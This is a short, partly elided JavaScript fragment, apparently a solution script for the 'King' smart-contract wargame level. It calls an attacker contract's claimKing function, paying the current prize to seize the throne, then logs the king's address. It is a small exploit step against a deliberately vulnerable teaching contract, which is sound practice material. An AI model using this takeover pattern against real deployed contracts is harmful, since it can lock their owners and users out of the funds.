...
async function main() {
    ...
    transactionResponse = await hacker.claimKing(king.address, {value: await king.prize()});
    await transactionResponse.wait();
    console.log("address of RealKing is ", await king._king());
    console.log("king of King is ", await king._king());
}
